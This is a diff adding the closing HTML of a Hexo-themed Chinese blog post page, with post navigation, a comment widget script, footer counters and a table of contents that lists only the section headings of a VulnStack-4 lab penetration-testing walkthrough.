+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="../../../03/18/Internal-network-5/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">内网提权教程——VulnStack-6靶场万字详细横向教程（CS搭建socks代理，Zerologon功能测试，PTH横向）</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../11/Internal-network-3/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">内网提权教程——VulnStack-3内网靶场横向提权详细教程(Joomla框架，MySQL日志注入，socks代理，PTH获取NTLM，Zerologon获取DC权限)</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '../../../../js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">内网提权教程——VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="nav-text">前置准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-text">网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%9A%84%E6%8B%93%E6%89%91%E5%9B%BE%E7%BB%93%E6%9E%84"><span class="nav-text">内网的拓扑图结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Struts2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">Struts2漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-text">web目录枚举（失败）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E%E8%BF%9E%E6%8E%A5%E4%B8%8A%E7%BA%BFWebshell"><span class="nav-text">冰蝎连接上线Webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-8-5-19-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">Tomcat 8.5.19 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-text">Web目录枚举（失败）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">Tomcat任意文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">phpmyadmin漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="nav-text">文件包含漏洞获取服务器权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">Docker服务器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Struts2%E6%9C%8D%E5%8A%A1"><span class="nav-text">Struts2服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat%E6%9C%8D%E5%8A%A1"><span class="nav-text">Tomcat服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5SSH%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="nav-text">写入SSH密钥获取权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmyadmin%E6%9C%8D%E5%8A%A1"><span class="nav-text">phpmyadmin服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E2%80%94%E2%80%94%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86"><span class="nav-text">内网横向——配置socks代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-text">MSF配置代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proxifier%E6%89%AB%E6%8F%8F"><span class="nav-text">proxifier扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91PC%E4%B8%BB%E6%9C%BA"><span class="nav-text">横向内网PC主机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz%E8%8E%B7%E5%8F%96NTLM%E5%93%88%E5%B8%8C"><span class="nav-text">mimikatz获取NTLM哈希</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8PTH%E6%A8%AA%E5%90%91%E5%9F%9F%E6%8E%A7"><span class="nav-text">使用PTH横向域控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">W1nner丶</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 7 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="js/build/libs/Swup.min.js"></script>
+
+<script src="js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
